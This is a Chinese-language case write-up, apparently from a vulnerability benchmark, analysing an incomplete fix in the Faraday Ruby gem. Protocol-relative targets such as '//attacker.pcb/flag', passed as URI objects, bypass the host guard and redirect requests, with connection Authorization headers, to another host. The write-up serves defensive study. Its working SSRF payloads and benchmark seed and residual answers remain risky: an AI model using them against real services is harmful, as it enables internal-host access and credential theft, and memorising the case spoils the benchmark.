# Faraday `build_exclusive_url`：字符串 `//host` 按住了，URI 对象没按住

- Case：`PCBV2-0107`（legacy `faraday-cve-2026-33637`）
- 产品：RubyGems `faraday`（lostisland）。本 case 用发布包 `Faraday::Connection` 做「基址钉死」的出站代理：`Faraday.new(url: 'http://trusted-base.pcb').get(用户目标)`。
- 链：CVE-2026-25765 / GHSA-33mh-2634-fwr2（2.14.0 → 2.14.1，字符串 `//` 加 `./` 前缀）→ CVE-2026-33637 / GHSA-5rv5-xj5j-3484（2.14.1 → 2.14.2，URI 先 `to_s`）
- 源码对着 GitHub tag `v2.14.1` / `v2.14.2` 的 `lib/faraday/connection.rb`：`build_exclusive_url`、`run_request`、`build_url`。运行时装的是发布包本身。

2026 年 2 月，Faraday 发现 RFC 3986 的 network-path `//evil.com` 在 `URI#merge`（`base + url`）时会覆盖基址的 host。2.14.1 给字符串补上「以 `//` 开头也加 `./`」。三个月后 GHSA-5rv5-xj5j-3484 标题就是 *Possible incomplete fix for GHSA-33mh-2634-fwr2: protocol-relative URI objects still bypass host scoping*。NVD CVE-2026-33637 写明 *when the request target is passed as a URI object (rather than a String)*。

根因不只是「少写了 `to_s`」。检查插在 `String#start_with?` 这一层；真正决定 TCP 对端的是 `URI#merge`。守卫自己用 `respond_to?(:start_with?)` 把自己从 URI 对象上摘掉。下面按请求走进去、2.14.1 改了哪一行、merge 怎么吃 authority、谁该先变成字符串，把这几层写完。

---

## 这块功能本来在干什么

应用把出站 HTTP 钉在一个信任上游上（webhook 转发、链接预览、内部服务代理），连接级带 `Authorization` 和默认 query。用户只被允许给「路径」：

```http
GET /fetch?to=//attacker.pcb/flag&mode=string
```

服务端：

```ruby
conn = Faraday.new(url: 'http://trusted-base.pcb')
# mode=string: conn.get(params['to'])
# mode=uri:    conn.get(URI(params['to']))   # 「先 parse 再请求」的常见写法
```

`run_request` → `req.url(url)` → `build_exclusive_url`。设计意图：最终 URL 的 host 必须还是 `trusted-base.pcb`。成功穿越之后的效果是：**请求打到另一台内部主机，连接级头跟着走**。本 case 的 flag 在 sidecar `attacker.pcb:80`（无宿主机端口），只有基址被覆盖时 Faraday 才能读到 `PCBFLAG_...`；`trusted-base.pcb` 只回 `TRUSTED-BASE OK`。

数据流：

```text
HTTP ?to= &mode=
    → Faraday::Connection#get / #run_request
    → build_exclusive_url(url)
         V1：若 respond_to?(:start_with?) 且 (相对 或 以 // 开头)
             url = "./#{url}"                         ← 补丁插在这里
         uri = base + url                             ← Ruby URI#merge，真正换 host
    → adapter 按 uri.host 发请求
    → 响应 body 回给 /fetch
```

没有登录。判断完全信任「相对 URL 不会改 host」；不信任用户给的字符串或 URI 对象在 merge 规则下会变成什么。

---

## 原始漏洞：协议相对字符串（CVE-2026-25765，faraday 2.14.0）

2.9.2（PR #1569）为了让 `service:search` 这种「看起来像 scheme」的相对路径不被当成绝对 URL，加过一次 `./` 前缀，但**明确放过**以 `/` 开头的输入：

```ruby
# lib/faraday/connection.rb :: build_exclusive_url  (2.14.0)
url = "./#{url}" if url.respond_to?(:start_with?) &&
                    !url.start_with?('http://', 'https://', '/', './', '../')
uri = url ? base + url : base
```

`//attacker.pcb/flag` 以 `/` 开头，守卫不开火。`URI#merge` 按 RFC 3986 §5.2.2：network-path reference 替换 authority。基址 `http://trusted-base.pcb/` + `//attacker.pcb/flag` → `http://attacker.pcb/flag`。

NVD CVE-2026-25765 / GHSA-33mh-2634-fwr2 原话就是这个 merge。本 case 的 seed：

```text
to = //attacker.pcb/flag
mode = string
```

2.14.0 解析结果 host = `attacker.pcb`，sidecar 把 flag 写进 body。`./` 前缀守卫在 2.14.0 就已经存在，当时没人拿 URI 对象当这个问题的一部分。

---

## 维护者改了什么（CVE-2026-25765 修复，2.14.1）

tag `v2.14.1` 只在原条件上加了 `|| url.start_with?('//')`。注释把 `//evil.com` 写进去了：

```ruby
# lib/faraday/connection.rb :: build_exclusive_url  (github.com/lostisland/faraday tag v2.14.1)
def build_exclusive_url(url = nil, params = nil, params_encoder = nil)
  url = nil if url.respond_to?(:empty?) && url.empty?
  base = url_prefix.dup
  if url && !base.path.end_with?('/')
    base.path = "#{base.path}/" # ensure trailing slash
  end
  # Ensure relative url will be parsed correctly (such as `service:search` or `//evil.com`)
  url = "./#{url}" if url.respond_to?(:start_with?) &&
                      (!url.start_with?('http://', 'https://', '/', './', '../') || url.start_with?('//'))
  uri = url ? base + url : base
  # ...
end
```

对 seed 这种**字符串** `//attacker.pcb/flag`：

```text
respond_to?(:start_with?) = true
start_with?('//')         = true
url 变成 ".///attacker.pcb/flag"
base + url 不再取 network-path，host 留在 trusted-base.pcb
body = TRUSTED-BASE OK ...
```

这就是 v1 + `--seed` 退出码 10。2.14.1 的 spec 只加了字符串用例（`build_exclusive_url('//evil.com/path')`）。

补丁默认了两件事：

1. 危险目标长得像字符串，并且 `start_with?('//')` 为真。
2. 不是字符串的对象要么不会进这个函数，要么不会走 `URI#merge` 的 network-path 规则。

第二点不成立。更关键的是：这一行的**整段**被 `respond_to?(:start_with?)` 短路；URI 对象在 Ruby 标准库里**没有** `start_with?`。

---

## 检查之后，谁真正消费那个 URL

守卫一结束（或被跳过），同一函数立刻：

```ruby
uri = url ? base + url : base
```

`URI::Generic#+` 就是 merge。若 `url` 仍是 `URI.parse('//attacker.pcb/flag')`，它已经带有 host 分量，merge 按绝对 / network-path 处理，基址 host 被换掉。

`run_request` 把用户参数原样塞进 `req.url(url)`，没有先 `url.to_s`。adapter 按最终 `uri.host` 建 TCP。过滤器刚看过的是「这个对象会不会 `start_with?`」；socket 看到的是 merge 后的 host。两套语义中间没有第二次谓词。

连接级 `Authorization` 在 `Connection` 上，不跟 path 走；host 一换，头跟着到攻击者。GHSA-5rv5-xj5j-3484 把这一点写进了 impact。

---

## 仓库里已经有更强的检查，URI 对象没用

`build_exclusive_url` 的注释和 2.14.1 测试已经承认 `//evil.com` 必须被当成相对路径。实现却把「认不认 `//`」绑死在 `String#start_with?` 上。

同一函数对空值已经做了 duck typing：`url.respond_to?(:empty?)`。它知道 `url` 不一定是 String。但「变成可做前缀检查的字符串」这件事，2.14.1 没做。

`respond_to?(:host)` 才是「这是不是 URI 对象」的自然谓词。它在 2.14.2 才出现，而且出现在守卫**之前**：

```ruby
# v2.14.2
url = url.to_s if url.respond_to?(:host)
```

V1 等于用一个对 URI 永远为假的 `respond_to?(:start_with?)` 当门卫。不是仓库里没有「先规范成字符串」的想法（空值、注释、测试都在暗示输入有多种形状），是 **2.14.1 没把 URI 收成 string**。

即便没有 `mode=uri`，只要应用 `URI.parse` 用户输入再交给 `conn.get`，同一条 merge 仍然覆盖 host。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs merge」落到具体代码：

- `url.respond_to?(:start_with?) && url.start_with?('//')`：看**字符串**是不是以两个斜杠开头
- `base + url`：看 Ruby URI 怎么合并 authority

只要构造一种输入，使「对象不是 String」从而跳过第一行，第二行仍然按 `//host` 换主机。

`URI('//attacker.pcb/flag')` 就是这样来的：

```text
URI 对象
  respond_to?(:start_with?) = false
  整段 if 不执行，url 仍是 URI
base + url
  → http://attacker.pcb/flag
sidecar 返回 PCBFLAG_...
```

字符串层面：用户给的还是 `//attacker.pcb/flag`。应用侧多了一次 `URI()`。Faraday 看到的类型变了，字符没变。V1 按类型决定要不要加 `./`；merge 按 RFC 决定 host。类型守卫比 merge 语义窄。

advisory 复现命令就是 `conn.get(URI(target))`，target 为 `"//" + host + path`。

---

## 残余仍然走同一条 build_exclusive_url（CVE-2026-33637）

没有换方法、没有换基址、没有换 sidecar。还是：

```http
GET /fetch?to=//attacker.pcb/flag&mode=uri
```

`build_exclusive_url` 仍然被 `get` 调用。V1 那两行 `start_with?` 照样在源码里；对 URI 对象它们根本不跑；`base + url` 覆盖 host；adapter 打到 `attacker.pcb`；body 里出现 flag。

本 case heldout / verify residual 把 candidate 写死为 `mode=uri`（同一 `to` 字符串）。认证：v1 + `--residual` 退出码 0。平台 residual 与 incomplete-fix 链是同一 sink（`build_exclusive_url` → merge），只换输入类型。

---

## 后来又补了什么（CVE-2026-33637，faraday 2.14.2）

tag `v2.14.2` 在守卫前插入一行，并把 `//` 判断提到前面：

```ruby
# lib/faraday/connection.rb :: build_exclusive_url  (tag v2.14.2)
url = url.to_s if url.respond_to?(:host)
# Ensure relative url will be parsed correctly (such as `service:search` or `//evil.com`)
url = "./#{url}" if url.respond_to?(:start_with?) &&
                    (url.start_with?('//') ||
                     !url.start_with?('http://', 'https://', '/', './', '../'))
uri = url ? base + url : base
```

对残余输入：`URI` 有 `host` → `to_s` 得到 `"//attacker.pcb/flag"` → 现在 `start_with?('//')` 为真 → `"./#{url}"` → host 留在基址。RubySec 有的条目写 2.14.3；`connection.rb` 在 2.14.2 与 2.14.3 字节相同，本 case V2 钉 2.14.2。

即便如此，这仍然是「在 merge 前改字符串」，没有在 merge 后断言 `uri.host == url_prefix.host`。对 `URI('//host')` 这条已知链它够用。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「字符串看起来像不像 `//`」。真正换 host 的是 `URI#merge`。V2 仍在同一层加码（先 `to_s`），没有在 merge 之后核验 host。

**不是没有更好的谓词。**  
「先变成 String 再做前缀检查」比「对会 `start_with?` 的对象做检查」更接近「所有输入都走同一套相对 URL 规则」。2.14.1 的测试只覆盖 String。从 V1 的 diff 只能看到条件里多了 `|| start_with?('//')`；要判断补丁是否闭合，必须看到 `url` 的类型和 `base + url` 的 RFC 规则。

**同一函数、同一 `$url`，只换了 Ruby 类型。**  
`get` / `post` / `build_url` / `req.url` 都进 `build_exclusive_url`。应用「先 `URI.parse` 做校验」反而踩进缺口。

**duck typing 把守卫从一种合法输入上摘掉了。**  
`respond_to?(:start_with?)` 本意是跳过非字符串；URI 恰好是另一种一等公民输入。对「可选类型」做安全检查时，缺省分支必须是拒绝或规范化，不能是「跳过检查、原样 merge」。

**金丝雀在另一主机上是有意的。**  
`attacker.pcb` 无宿主机端口。能读到 flag，说明 Faraday 真的对那台内部服务发了请求，而不是应用自己拼出了字符串。

---

## 版本、入口、参考

| | gem | `build_exclusive_url` | `base + url` | 字符串 `//host` seed | URI `//host` residual |
|---|---|---|---|---|---|
| V0 | 2.14.0 | `./` 前缀，但 `/` 开头豁免 | merge 换 host | 打到 attacker | 同样换 host |
| V1 | 2.14.1 | 字符串 `//` 也加 `./`；门仍是 `start_with?` | 同上 | 留在 trusted-base | 跳过守卫，换 host |
| V2 | 2.14.2 | 先 `to_s if respond_to?(:host)` | 同上 | 挡 | 变成字符串后加 `./`，挡 |

- Web：`GET /fetch?to=//attacker.pcb/flag&mode=string|uri`
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到。
- [CVE-2026-25765](https://nvd.nist.gov/vuln/detail/CVE-2026-25765)、[GHSA-33mh-2634-fwr2](https://github.com/lostisland/faraday/security/advisories/GHSA-33mh-2634-fwr2)
- [CVE-2026-33637](https://nvd.nist.gov/vuln/detail/CVE-2026-33637)、[GHSA-5rv5-xj5j-3484](https://github.com/lostisland/faraday/security/advisories/GHSA-5rv5-xj5j-3484)
- 源码：`https://github.com/lostisland/faraday/blob/v2.14.1/lib/faraday/connection.rb`、`.../blob/v2.14.2/lib/faraday/connection.rb`
